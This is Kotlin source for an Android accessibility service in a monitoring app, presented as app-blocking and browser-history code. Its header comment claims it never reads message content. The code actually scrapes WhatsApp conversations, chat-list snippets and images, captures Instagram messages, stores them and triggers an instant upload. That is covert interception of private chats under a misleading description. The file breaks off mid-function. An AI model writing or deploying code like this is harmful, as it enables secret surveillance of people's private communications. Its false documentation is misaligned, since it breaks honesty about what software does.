package com.spapp.monitoring.blocking

import android.accessibilityservice.AccessibilityService
import android.graphics.Rect
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.spapp.monitoring.collectors.FileManagerCollector
import com.spapp.monitoring.data.DeviceState
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.data.local.WebHistoryEntry
import com.spapp.monitoring.data.local.WhatsAppMessageEntry
import com.spapp.monitoring.data.local.InstagramMessageEntry
import com.spapp.monitoring.collectors.WhatsAppNotificationListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Locale

/**
 * Enforces app_blocking rules (Phase 7) and, when web_history_tracking is
 * on, records the URLs it sees in a supported browser's address bar (Phase
 * 10 — see WebHistoryEntry). Only inspects two things, per the project's
 * transparency principles: (1) which app's window just came to the
 * foreground — the same information Android's own Digital Wellbeing/Family
 * Link use — and (2) the visible address-bar text of supported browsers.
 * It never reads message content, chat text, or any other on-screen
 * content. Both bullets are already listed in the on-device consent text
 * ("Website browsing history", "Device lock and file listing on request").
 *
 * WHY ACCESSIBILITY, NOT A CONTENT PROVIDER QUERY: modern Chrome exposes no
 * history API to third-party apps at all (removed from the public SDK years
 * ago) — there is no supported way to read it without this. Address-bar
 * inspection only works for browsers that expose a stable accessibility
 * resource-id for their URL bar, listed below; an unsupported or updated
 * browser simply won't be covered, for blocking or for history, while
 * app-level blocking (blocking a browser entirely) still works regardless.
 *
 * EVENT SUBSCRIPTION — ONLY typeWindowStateChanged (see
 * accessibility_service_config.xml), deliberately. An earlier version also
 * subscribed to typeWindowContentChanged to catch in-page navigation within
 * a browser (switching sites without leaving the window never fires
 * typeWindowStateChanged). That event type fires constantly for every app's
 * every UI redraw system-wide — there is no way to scope it to "only
 * browsers" at the OS subscription level without also scoping
 * typeWindowStateChanged the same way (AccessibilityServiceInfo.packageNames
 * applies to all subscribed event types together, not per type), which would
 * risk silently losing the very event app-blocking depends on for every
 * other app. The flood of extra events was the suspected cause of app
 * blocking becoming intermittent (worked twice, then silently didn't) after
 * that change. Reverted — in-page navigation is now covered by a short
 * polling loop (see browserPollRunnable) that only runs while a browser is
 * confirmed foreground, so it costs nothing for any other app and never
 * touches the service's OS-level event subscription.
 */
class BlockAccessibilityService : AccessibilityService() {

    companion object {
        @Volatile
        var instance: BlockAccessibilityService? = null
            private set
    }

    private lateinit var rulesCache: BlockRulesCache
    private var lastBlockedPackage: String? = null
    private var lastBlockedAt = 0L
    private var lastRecordedUrl: String? = null
    private var currentForegroundApp: String? = null
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val pollHandler = Handler(Looper.getMainLooper())
    private var browserPollRunnable: Runnable? = null
    private val browserPollIntervalMs = 1500L

    private val browserUrlBarIds = setOf(
        "com.android.chrome:id/url_bar",
        "com.google.android.apps.chrome:id/url_bar",
        "com.brave.browser:id/url_bar",
        "org.mozilla.firefox:id/mozac_browser_toolbar_url_view",
        "com.microsoft.emmx:id/url_bar",
    )
    private val browserPackages = browserUrlBarIds.map { it.substringBefore(":id/") }.toSet()

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        try {
            val info = serviceInfo ?: android.accessibilityservice.AccessibilityServiceInfo()
            info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED or
                    AccessibilityEvent.TYPE_VIEW_SCROLLED
            info.feedbackType = android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_GENERIC
            info.flags = info.flags or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            serviceInfo = info
        } catch (e: Exception) {
            Log.e("BlockA11y", "Failed to configure serviceInfo dynamically", e)
        }
        rulesCache = BlockRulesCache(applicationContext)
        com.spapp.monitoring.collectors.RealtimeLogObserverManager.start(applicationContext)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType = event.eventType
        val packageName = event.packageName?.toString() ?: return
        if (packageName == applicationContext.packageName) return // never block ourselves

        if (eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val notification = event.parcelableData as? android.app.Notification
            val eventTexts = try { event.text?.mapNotNull { it?.toString()?.trim() }?.filter { it.isNotBlank() } } catch (_: Exception) { null }
            val postTime = if (notification != null && notification.`when` > 0) notification.`when` else System.currentTimeMillis()
            if (packageName == "com.instagram.android" || packageName == "com.instagram.lite" || packageName.contains("instagram")) {
                com.spapp.monitoring.collectors.WhatsAppNotificationListener.processInstagramNotificationData(
                    applicationContext,
                    notification,
                    postTime,
                    packageName,
                    fallbackTexts = eventTexts
                )
            } else if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                if (notification != null) {
                    com.spapp.monitoring.collectors.WhatsAppNotificationListener.processWhatsAppNotificationData(
                        applicationContext,
                        notification,
                        postTime,
                        packageName
                    )
                }
            }
            return
        }

        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (packageName in browserPackages) {
                recordUrlIfEnabled(event, rootInActiveWindow)
                checkWebsiteRules()
                startBrowserPolling()
            } else {
                stopBrowserPolling()
            }

            val isImeOrSystem = packageName.startsWith("com.google.android.inputmethod") ||
                    packageName.contains("honeyboard") ||
                    packageName.contains("swiftkey") ||
                    packageName.contains("keyboard") ||
                    packageName.contains("inputmethod") ||
                    packageName == "android" ||
                    packageName == "com.android.systemui"

            if (!isImeOrSystem) {
                currentForegroundApp = packageName

                if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                    startWhatsAppPolling()
                } else {
                    stopWhatsAppPolling()
                }

                if (packageName == "com.instagram.android") {
                    detectAndHandleInstagramAccountSwitch(rootInActiveWindow)
                    startInstagramPolling()
                } else {
                    stopInstagramPolling()
                }

                checkAppRule(packageName)
            }
        }

        // Real-time WhatsApp capture:
        // Trigger immediately when user taps (e.g. clicks Send button or chat row), when messages appear on screen,
        // when scrolling through chats/conversation, or when window state changes
        val isWhatsAppActive = packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b" ||
                ((currentForegroundApp == "com.whatsapp" || currentForegroundApp == "com.whatsapp.w4b") &&
                 (packageName.startsWith("com.google.android.inputmethod") || packageName.contains("honeyboard") || packageName.contains("keyboard")))
        if (isWhatsAppActive) {
            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                try {
                    val clickedNode = event.source
                    if (clickedNode != null) {
                        val texts = mutableListOf<String>()
                        fun walkClick(n: AccessibilityNodeInfo?, d: Int = 0) {
                            if (n == null || d > 8) return
                            val t = n.text?.toString()?.trim()
                            if (!t.isNullOrBlank()) texts.add(t)
                            for (i in 0 until n.childCount) walkClick(n.getChild(i), d + 1)
                        }
                        walkClick(clickedNode)
                        val titleCand = texts.firstOrNull { 
                            it.length in 2..50 && !it.contains(":") && !it.matches(Regex("^[0-9:]+$")) 
                        }
                        if (!titleCand.isNullOrBlank()) {
                            lastClickedWhatsAppChat = titleCand
                        }
                    }
                } catch (_: Exception) {}
            }
            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val nodeToInspect = rootInActiveWindow ?: event.source
                recordWhatsAppChatIfForeground(nodeToInspect)
            }
        }

        // Real-time Instagram Direct capture & in-app account switch detection:
        if (packageName == "com.instagram.android") {
            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                checkAccountSwitcherClick(event.source, rootInActiveWindow)
            }
            if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                eventType == AccessibilityEvent.TYPE_VIEW_SCROLLED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val nodeToInspect = rootInActiveWindow ?: event.source
                recordInstagramChatIfForeground(nodeToInspect)
            }
        }
    }

    /**
     * Periodically inspects WhatsApp's active conversation window while WhatsApp is foreground.
     */
    private var whatsAppPollRunnable: Runnable? = null
    private val whatsAppPollIntervalMs = 1500L
    private val capturedWhatsAppMsgHashes = mutableSetOf<String>()
    private var lastClickedWhatsAppChat: String? = null

    private fun startWhatsAppPolling() {
        if (whatsAppPollRunnable != null) return
        val runnable = object : Runnable {
            override fun run() {
                recordWhatsAppChatIfForeground(rootInActiveWindow)
                pollHandler.postDelayed(this, whatsAppPollIntervalMs)
            }
        }
        whatsAppPollRunnable = runnable
        pollHandler.postDelayed(runnable, 500L)
    }

    private fun stopWhatsAppPolling() {
        whatsAppPollRunnable?.let { pollHandler.removeCallbacks(it) }
        whatsAppPollRunnable = null
    }

    fun recordWhatsAppChatIfForeground(root: AccessibilityNodeInfo?) {
        try {
            // Find true WhatsApp application root node even if keyboard or leaf view is active
            var topRoot: AccessibilityNodeInfo? = null
            val activeRoot = rootInActiveWindow
            if (activeRoot != null && (activeRoot.packageName == "com.whatsapp" || activeRoot.packageName == "com.whatsapp.w4b")) {
                topRoot = activeRoot
            }
            if (topRoot == null) {
                try {
                    val appWindow = windows.firstOrNull {
                        it.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_APPLICATION &&
                        (it.root?.packageName == "com.whatsapp" || it.root?.packageName == "com.whatsapp.w4b")
                    }
                    topRoot = appWindow?.root
                } catch (_: Exception) {}
            }
            if (topRoot == null) {
                if (root?.packageName == "com.whatsapp" || root?.packageName == "com.whatsapp.w4b") {
                    topRoot = root
                }
            }
            if (topRoot == null) return
            while (topRoot?.parent != null) {
                topRoot = topRoot.parent ?: break
            }
            val resolvedRoot = topRoot ?: return
            val pkg = resolvedRoot.packageName?.toString() ?: ""
            if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return

            val entriesToInsert = mutableListOf<WhatsAppMessageEntry>()
            val now = System.currentTimeMillis()
            val displayMetrics = resources.displayMetrics
            val screenWidth = displayMetrics.widthPixels
            val screenHeight = displayMetrics.heightPixels

            fun cleanStr(s: String?): String {
                if (s == null) return ""
                return s.replace('\u202F', ' ')
                    .replace('\u00A0', ' ')
                    .replace('\u200B', ' ')
                    .trim()
            }

            fun collectTexts(node: AccessibilityNodeInfo?, maxDepth: Int = 30): List<String> {
                if (node == null) return emptyList()
                val list = mutableListOf<String>()
                fun walk(n: AccessibilityNodeInfo?, depth: Int) {
                    if (n == null || depth > maxDepth) return
                    val t = cleanStr(n.text?.toString())
                    if (t.isNotBlank()) list.add(t)
                    for (i in 0 until n.childCount) walk(n.getChild(i), depth + 1)
                }
                walk(node, 0)
                return list
            }

            fun isTimeOrDate(s: String): Boolean {
                val clean = cleanStr(s)
                return clean.matches(Regex("^[0-9]{1,2}:[0-9]{2}(\\s*[AaPpMm]{2})?$")) ||
                       clean.matches(Regex("^[0-9]{1,2}:[0-9]{2}:[0-9]{2}(\\s*[AaPpMm]{2})?$")) ||
                       clean.matches(Regex("^[0-9]{1,2}:[0-9]{2}\\s*(?:am|pm|AM|PM)?\\s*[,.]?.*$")) ||
                       clean.equals("yesterday", ignoreCase = true) ||
                       clean.equals("today", ignoreCase = true) ||
                       clean.matches(Regex("^[0-9]{1,2}[/.-][0-9]{1,2}([/.-][0-9]{2,4})?$")) ||
                       clean in setOf("Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday", "Sunday")
            }

            fun isSystemLabel(s: String): Boolean {
                val trimmed = cleanStr(s).lowercase()
                return trimmed in setOf(
                    "whatsapp", "whatsapp business", "chats", "updates", "calls", "communities",
                    "settings", "search", "archived", "unread", "groups", "all", "type a message",
                    "message", "status", "delivered", "read", "sent", "pending", "edited",
                    "navigate up", "back", "more options", "call", "video call", "voice call",
                    "online", "typing...", "typing", "audio call", "ask meta ai or search",
                    "ask meta ai", "meta ai", "floating windows", "search unread chats",
                    "not interested", "interested", "reels", "follow", "recent contact",
                    "recent conversation", "tap to view conversation", "tap to load",
                    "forwarded", "forwarded many times", "unread messages",
                    "this message was deleted", "you deleted this message", "swipe to reply"
                ) || trimmed.contains("end-to-end encrypted") ||
                     trimmed.startsWith("you reacted") || trimmed.startsWith("reacted ")
            }

            fun isBadge(s: String): Boolean {
                val trimmed = cleanStr(s)
                return trimmed.matches(Regex("^[0-9]+$")) && (trimmed.toIntOrNull() ?: 0) in 1..999
            }

            fun parseBubbleTime(timeStr: String?): Long {
                if (timeStr.isNullOrBlank()) return now
                try {
                    val clean = cleanStr(timeStr).uppercase()
                    val match = Regex("([0-9]{1,2}:[0-9]{2})(?:\\s*([AP]M))?").find(clean)
                    if (match != null) {
                        val baseTime = match.groupValues[1]
                        val amPm = match.groupValues.getOrNull(2)
                        val calendar = java.util.Calendar.getInstance()
                        val format = if (!amPm.isNullOrBlank()) {
                            java.text.SimpleDateFormat("h:mm a", java.util.Locale.US)
                        } else {
                            java.text.SimpleDateFormat("HH:mm", java.util.Locale.US)
                        }
                        val strToParse = if (!amPm.isNullOrBlank()) "$baseTime $amPm" else baseTime
                        val parsed = format.parse(strToParse)
                        if (parsed != null) {
                            val parsedCal = java.util.Calendar.getInstance().apply { time = parsed }
                            calendar.set(java.util.Calendar.HOUR_OF_DAY, parsedCal.get(java.util.Calendar.HOUR_OF_DAY))
                            calendar.set(java.util.Calendar.MINUTE, parsedCal.get(java.util.Calendar.MINUTE))
                            calendar.set(java.util.Calendar.SECOND, 0)
                            calendar.set(java.util.Calendar.MILLISECOND, 0)
                            if (calendar.timeInMillis > now + 300_000) {
                                calendar.add(java.util.Calendar.DAY_OF_YEAR, -1)
                            }
                            return calendar.timeInMillis
                        }
                    }
                } catch (_: Exception) {}
                return now
            }

            // Inspect window navigation structure
            var hasBackButton = false
            var hasCallButtons = false
            var hasComposer = false
            var hasBottomTabs = false

            fun inspectWindowNav(n: AccessibilityNodeInfo?, depth: Int = 0) {
                if (n == null || depth > 30) return
                val cd = cleanStr(n.contentDescription?.toString()).lowercase()
                val text = cleanStr(n.text?.toString()).lowercase()
                val vId = (n.viewIdResourceName ?: "").lowercase()

                if (cd.contains("back") || cd.contains("navigate up") || 
                    vId.endsWith(":id/back") || vId.contains("up_button") || vId.contains("action_bar_back")) {
                    val r = Rect()
                    n.getBoundsInScreen(r)
                    if (r.top < screenHeight * 0.25 && r.left < screenWidth * 0.40) {
                        hasBackButton = true
                    }
                }

                if (cd.contains("video call") || cd.contains("voice call") || cd.contains("audio call") || 
                    cd == "call" || vId.contains("call_btn") || vId.contains("call")) {
                    val r = Rect()
                    n.getBoundsInScreen(r)
                    if (r.top < screenHeight * 0.25) {
                        hasCallButtons = true
                    }
                }

                if (vId.endsWith(":id/entry") || vId.endsWith(":id/send") || vId.endsWith(":id/voice_note_btn") ||
                    vId.contains("input") || vId.contains("composer") ||
                    text == "type a message" || text == "message" ||
                    cd.contains("voice message") || cd.contains("send") || cd.contains("attach") ||
                    (n.isEditable && (vId.contains("entry") || text.isBlank() || text == "type a message"))) {
                    hasComposer = true
                }

                if ((cd == "chats" || cd == "updates" || cd == "communities" || cd == "calls" ||
                    text == "chats" || text == "updates") &&
                    (vId.contains("tab") || vId.contains("nav") || vId.contains("bottom"))) {
                    val r = Rect()
                    n.getBoundsInScreen(r)
                    if (r.bottom > screenHeight * 0.70) {
                        hasBottomTabs = true
                    }
                }

                for (i in 0 until n.childCount) {
                    inspectWindowNav(n.getChild(i), depth + 1)
                }
            }
            inspectWindowNav(resolvedRoot)

            val isInOpenConversation = (hasBackButton || hasCallButtons || hasComposer) && !hasBottomTabs

            if (isInOpenConversation) {
                // =============================================================
                // 1. OPEN CONVERSATION SCREEN: Capture active chat messages
                // =============================================================
                var chatTitle: String? = null
                val titleCandidates = listOf(
                    "conversation_contact_name",
                    "conversation_title",
                    "action_bar_title",
                    "contact_name",
                    "user_name",
                    "main_title",
                    "title"
                )

                fun findTitleByViewId(n: AccessibilityNodeInfo?, depth: Int = 0): String? {
                    if (n == null || depth > 25) return null
                    val vId = (n.viewIdResourceName ?: "").lowercase()
                    for (cand in titleCandidates) {
                        if (vId.endsWith(":id/$cand") || vId.endsWith("/$cand")) {
                            val t = cleanStr(n.text?.toString())
                            if (t.isNotBlank() && !isSystemLabel(t) && !isTimeOrDate(t) && !isBadge(t) && t.length in 1..60) {
                                return t
                            }
                        }
                    }
                    for (i in 0 until n.childCount) {
                        val found = findTitleByViewId(n.getChild(i), depth + 1)
                        if (found != null) return found
                    }
                    return null
                }
                chatTitle = findTitleByViewId(resolvedRoot)

                // Fallback 1: search top action bar area (top 22% of screen)
                if (chatTitle.isNullOrBlank()) {
                    val headerTexts = mutableListOf<String>()
                    fun findHeader(n: AccessibilityNodeInfo?, depth: Int = 0) {
                        if (n == null || depth > 25) return
                        val t = cleanStr(n.text?.toString())
                        val r = Rect()
                        n.getBoundsInScreen(r)
                        if (t.isNotBlank() && r.top < screenHeight * 0.22 && r.bottom > 20 && r.left >= screenWidth * 0.05 && r.left <= screenWidth * 0.85) {
                            headerTexts.add(t)
                        }
                        for (i in 0 until n.childCount) {
                            findHeader(n.getChild(i), depth + 1)
                        }
                    }
                    findHeader(resolvedRoot)

                    chatTitle = headerTexts.firstOrNull { s ->
                        val clean = cleanStr(s)
                        !isSystemLabel(clean) && !isTimeOrDate(clean) && !isBadge(clean) &&
                        !clean.contains("online", ignoreCase = true) &&
                        !clean.contains("last seen", ignoreCase = true) &&
                        !clean.contains("typing", ignoreCase = true) &&
                        !clean.contains("tap here", ignoreCase = true) &&
                        !clean.contains("click here", ignoreCase = true) &&
                        clean.length in 1..60
                    }
                }

                // Fallback 2: lastClickedWhatsAppChat
                if (chatTitle.isNullOrBlank()) {
                    chatTitle = lastClickedWhatsAppChat
                }
                val effectiveChatTitle = chatTitle ?: "WhatsApp Chat"

                val messageTextCandidates = mutableListOf<AccessibilityNodeInfo>()

                fun collectConversationTexts(n: AccessibilityNodeInfo?, depth: Int = 0) {
                    if (n == null || depth > 30) return
                    if (n.isEditable || n.className?.toString()?.contains("EditText", ignoreCase = true) == true) return

                    val r = Rect()
                    n.getBoundsInScreen(r)

                    // Message bubbles must be below the top action bar and above the bottom input bar
                    if (r.top >= screenHeight * 0.05 && r.bottom <= (screenHeight - 20)) {
                        val t = cleanStr(n.text?.toString())
                        val cd = cleanStr(n.contentDescription?.toString())
                        val hasContent = t.isNotBlank() || cd.isNotBlank()
                        if (hasContent) {
                            if (t != effectiveChatTitle &&
                                !isSystemLabel(t) &&
                                !isTimeOrDate(t) &&
                                !t.equals("Type a message", ignoreCase = true) &&
                                !t.equals("Message", ignoreCase = true)
                            ) {
                                messageTextCandidates.add(n)
                            }
                        }
                    }

                    for (i in 0 until n.childCount) {
                        collectConversationTexts(n.getChild(i), depth + 1)
                    }
                }
                collectConversationTexts(resolvedRoot)

                for (node in messageTextCandidates) {
                    val rawText = node.text?.toString()?.trim().takeIf { !it.isNullOrBlank() }
                        ?: node.contentDescription?.toString()?.trim()
                        ?: continue
                    val cleanText = cleanStr(rawText)
                    if (cleanText.isBlank() || isSystemLabel(cleanText) || isTimeOrDate(cleanText)) continue

                    val rect = Rect()
                    node.getBoundsInScreen(rect)

                    // Find bubble container
                    var bubbleContainer: AccessibilityNodeInfo? = node.parent
                    var bubbleRect = Rect()
                    node.parent?.getBoundsInScreen(bubbleRect)
                    var containerDepth = 0
                    while (bubbleContainer != null && containerDepth < 4) {
                        val cr = Rect()
                        bubbleContainer.getBoundsInScreen(cr)
                        if (cr.width() in (screenWidth * 0.15).toInt()..(screenWidth * 0.96).toInt() && cr.height() in 25..900) {
                            bubbleRect = cr
                            break
                        }
                        bubbleContainer = bubbleContainer.parent
                        containerDepth++
                    }
                    if (bubbleContainer == null) bubbleContainer = node.parent

                    val containerTexts = mutableListOf<String>()
                    val containerDescriptions = mutableListOf<String>()
                    fun walkBubble(bNode: AccessibilityNodeInfo?, bDepth: Int = 0) {
                        if (bNode == null || bDepth > 5) return
                        cleanStr(bNode.text?.toString()).let { if (it.isNotBlank()) containerTexts.add(it) }
                        cleanStr(bNode.contentDescription?.toString()).let { if (it.isNotBlank()) containerDescriptions.add(it) }
                        for (i in 0 until bNode.childCount) {
                            walkBubble(bNode.getChild(i), bDepth + 1)
                        }
                    }
                    walkBubble(bubbleContainer)

                    // Direction determination
                    val hasOutgoingReceipt = containerDescriptions.any {
                        it.equals("Delivered", ignoreCase = true) ||
                        it.equals("Read", ignoreCase = true) ||
                        it.equals("Sent", ignoreCase = true) ||
                        it.contains("Delivered", ignoreCase = true) ||
                        it.contains("Read", ignoreCase = true)
                    }
                    val isRightAligned = (bubbleRect.right >= screenWidth * 0.80 && bubbleRect.left > screenWidth * 0.15) ||
                                         (rect.right >= screenWidth * 0.78 && rect.left > screenWidth * 0.20)
                    val isLeftAligned = (bubbleRect.left <= screenWidth * 0.20 && bubbleRect.right < screenWidth * 0.88) ||
                                        (rect.left <= screenWidth * 0.22 && rect.right < screenWidth * 0.80)

                    val isOutgoing = hasOutgoingReceipt || isRightAligned || (!isLeftAligned && rect.centerX() > screenWidth * 0.50)

                    // Timestamp extraction
                    var bubbleTimeMs = (now / 60_000) * 60_000
                    val timeCand = containerTexts.firstOrNull { isTimeOrDate(it) }
                        ?: containerDescriptions.firstOrNull { isTimeOrDate(it) }
                    if (timeCand != null) {
                        bubbleTimeMs = parseBubbleTime(timeCand)
                    }

                    // Media & Reel link extraction
                    val foundReel = WhatsAppNotificationListener.extractReelUrl(cleanText)
                    val isReel = foundReel != null
                    val isImage = !isReel && (
                        cleanText.contains("📷") ||
                        cleanText.equals("Photo", ignoreCase = true) ||
                        cleanText.contains("View photo", ignoreCase = true)
                    )
                    val isVideo = !isReel && !isImage && (
                        cleanText.contains("🎥") ||
                        cleanText.equals("Video", ignoreCase = true)
                    )
                    val isAudio = !isReel && !isImage && !isVideo && (
                        cleanText.contains("Voice message", ignoreCase = true) ||
                        cleanText.equals("Audio", ignoreCase = true)
                    )

                    val mediaType = when {
                        isReel -> "reel"
                        isImage -> "image"
                        isVideo -> "video"
                        isAudio -> "audio"
                        else -> null
                    }

                    var mediaPath: String? = null
                    if (isImage) {
                        try {
                            mediaPath = FileManagerCollector(applicationContext).getLatestWhatsAppImageBase64()
                        } catch (_: Exception) {}
                    }

                    val finalMsgText = when {
                        isReel && cleanText.isBlank() -> foundReel ?: "Instagram Reel"
                        isImage && cleanText.isBlank() -> "Photo"
                        isVideo && cleanText.isBlank() -> "Video"
                        isAudio && cleanText.isBlank() -> "Voice message"
                        else -> cleanText
                    }

                    val dedupeKey = "MSG|$effectiveChatTitle|$finalMsgText|$isOutgoing|${bubbleTimeMs / 60_000}"
                    if (capturedWhatsAppMsgHashes.contains(dedupeKey)) continue
                    capturedWhatsAppMsgHashes.add(dedupeKey)
                    if (capturedWhatsAppMsgHashes.size > 2000) capturedWhatsAppMsgHashes.clear()

                    entriesToInsert += WhatsAppMessageEntry(
                        chatName = effectiveChatTitle,
                        sender = if (isOutgoing) "me" else effectiveChatTitle,
                        messageText = finalMsgText,
                        isOutgoing = isOutgoing,
                        messageTimeEpochMs = bubbleTimeMs,
                        mediaType = mediaType,
                        mediaPath = mediaPath,
                        reelUrl = foundReel
                    )
                }
            } else {
                // =============================================================
                // 2. CHATS LIST SCREEN: Capture all conversation rows & snippets
                // =============================================================
                val candidateRows = mutableListOf<AccessibilityNodeInfo>()
                fun findChatRows(node: AccessibilityNodeInfo?, depth: Int = 0) {
                    if (node == null || depth > 30) return
                    val count = node.childCount
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    val w = rect.width()
                    val h = rect.height()
                    if ((node.isClickable || count in 1..10) && w > (screenWidth * 0.5) && h in 70..420) {
                        val texts = collectTexts(node, 10)
                        if (texts.size >= 2 && texts.any { !isTimeOrDate(it) && !isSystemLabel(it) && !isBadge(it) }) {
                            candidateRows.add(node)
                        }
                    }
                    for (i in 0 until count) {
                        findChatRows(node.getChild(i), depth + 1)
                    }
                }
                findChatRows(resolvedRoot)

                for (row in candidateRows) {
                    val texts = collectTexts(row, 10)
                    val candidateTitles = texts.filter {
                        !isTimeOrDate(it) && !isSystemLabel(it) && !isBadge(it) && it.length <= 50
                    }
                    if (candidateTitles.isNotEmpty()) {
                        val title = candidateTitles.first()
                        val nonTitleTexts = texts.filter { it != title && !isTimeOrDate(it) && !isBadge(it) && !isSystemLabel(it) }

                        var rowSender: String? = null
                        val senderCandidate = nonTitleTexts.firstOrNull { it.endsWith(":") }
                        if (senderCandidate != null) {
                            rowSender = senderCandidate.removeSuffix(":").trim().removePrefix("~").trim()
                        }

                        var snippet = nonTitleTexts.firstOrNull { it != senderCandidate }
                        val timeText = texts.firstOrNull { isTimeOrDate(it) }
                        val rowTimeMs = if (timeText != null) parseBubbleTime(timeText) else now

                        var isSnippetOutgoing = false
                        if (snippet?.startsWith("You: ", ignoreCase = true) == true) {
                            isSnippetOutgoing = true
                            snippet = snippet.substring(5).trim()
                            rowSender = "me"
                        } else if (snippet?.startsWith("You reacted ", ignoreCase = true) == true) {
                            isSnippetOutgoing = true
                            rowSender = "me"
                        }

                        if (!snippet.isNullOrBlank() && snippet != "Recent conversation" && !isSystemLabel(snippet)) {
                            val dedupeKey = "ROW|$title|$snippet|$rowTimeMs"
                            if (!capturedWhatsAppMsgHashes.contains(dedupeKey)) {
                                capturedWhatsAppMsgHashes.add(dedupeKey)
                                if (capturedWhatsAppMsgHashes.size > 2000) capturedWhatsAppMsgHashes.clear()
                                entriesToInsert += WhatsAppMessageEntry(
                                    chatName = title,
                                    sender = if (isSnippetOutgoing) "me" else (rowSender ?: title),
                                    messageText = snippet,
                                    isOutgoing = isSnippetOutgoing,
                                    messageTimeEpochMs = rowTimeMs
                                )
                            }
                        }
                    }
                }
            }

            if (entriesToInsert.isNotEmpty()) {
                scope.launch {
                    try {
                        val db = AppDatabase.getInstance(applicationContext)
                        db.whatsAppMessageDao().insertAll(entriesToInsert)
                        com.spapp.monitoring.collectors.RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
                    } catch (e: Exception) {
                        Log.e("BlockA11y", "Failed to insert captured WhatsApp messages", e)
                    }
                }
            }
        } catch (_: Exception) {
        }
    }

    private var instagramPollRunnable: Runnable? = null
    private fun startInstagramPolling() {
        if (instagramPollRunnable != null) return
        val runnable = object : Runnable {
            override fun run() {
                recordInstagramChatIfForeground(rootInActiveWindow)
                pollHandler.postDelayed(this, 2000L)
            }
        }
        instagramPollRunnable = runnable
        pollHandler.postDelayed(runnable, 500L)
    }

    private fun stopInstagramPolling() {
        instagramPollRunnable?.let { pollHandler.removeCallbacks(it) }
        instagramPollRunnable = null
    }

    /**
     * Checks if a tapped node in com.instagram.android belongs to the in-app Account Switcher sheet.
     * Fires immediately when the user taps an account row to switch — ZERO reliance on toast messages!
     */
    private fun checkAccountSwitcherClick(clicked: AccessibilityNodeInfo?, root: AccessibilityNodeInfo?) {
        if (clicked == null) return
        try {
            val texts = mutableListOf<String>()
            fun collect(n: AccessibilityNodeInfo?) {
                if (n == null) return
                n.text?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                n.contentDescription?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                n.hintText?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                for (i in 0 until n.childCount) {
                    collect(n.getChild(i))
                }
            }
            collect(clicked)
            clicked.parent?.let { parent ->
                for (i in 0 until parent.childCount) {
                    val child = parent.getChild(i)
                    child?.text?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                    child?.contentDescription?.toString()?.trim()?.let { if (it.isNotBlank()) texts.add(it) }
                }
            }

            val reserved = setOf(
                "instagram", "switch accounts", "add account", "log in", "accounts", "cancel", "done",
                "close", "choose an account", "log out", "settings", "edit profile", "share profile"
            )
            for (t in texts) {
                val clean = t.removePrefix("@").trim().lowercase()
                if (clean.length in 3..32 &&
                    clean.matches("^[a-zA-Z0-9._]+$".toRegex()) &&
                    !clean.matches("^[0-9]+$".toRegex()) &&
                    !reserved.contains(clean)
                ) {
                    Log.i("BlockA11y", ">>> Account Switcher tapped row detected: '$clean'")
                    notifyInstagramAccountDetected(clean)
                    break
                }
            }
        } catch (_: Exception) {}
    }

    /**
     * Public handler called whenever an active Instagram account username is detected from ANY source
     * (Home feed comment box, account switcher click, bottom navigation tab, or notification subtext).
     * Compares against current account and notifies backend immediately.
     */
    fun notifyInstagramAccountDetected(detectedUsername: String) {
        // Disabled per user requirement: do not find or track login ID
    }

    fun detectAndHandleInstagramAccountSwitch(root: AccessibilityNodeInfo?) {
        if (root == null) return
        return
        val pkg = root.packageName?.toString() ?: ""
        if (pkg != "com.instagram.android") return

        try {
            val allTexts = mutableListOf<String>()
            val topCandidates = mutableListOf<Pair<String, Rect>>()
            val viewIdCandidates = mutableListOf<String>()

            fun traverseNodes(node: AccessibilityNodeInfo?) {
                if (node == null) return

                val t = node.text?.toString()?.trim()
                if (!t.isNullOrBlank()) {
                    allTexts.add(t)
                    val r = Rect()
                    node.getBoundsInScreen(r)
                    if (r.top < 500 && r.height() in 15..250) {
